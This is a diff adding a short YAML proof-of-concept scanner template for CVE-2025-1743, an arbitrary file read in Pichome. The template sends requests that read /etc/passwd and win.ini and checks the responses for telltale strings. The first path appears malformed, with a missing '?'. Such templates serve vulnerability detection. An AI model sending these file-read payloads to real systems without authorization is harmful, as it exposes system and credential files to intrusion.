@@ -1,0 +1,11 @@
+name: poc-yaml-Pichome-Directory
+description: "CVE-2025-1743(任意文件读取)"
+method: GET
+path:
+  - /index.phpmod=textviewer&src=file:///etc/passwd
+  - /index.php?mod=textviewer&op=index&src=C:/windows/win.ini
+expression:
+  status: 200
+  body_any:
+    - "root:"
+    - "[fonts]"
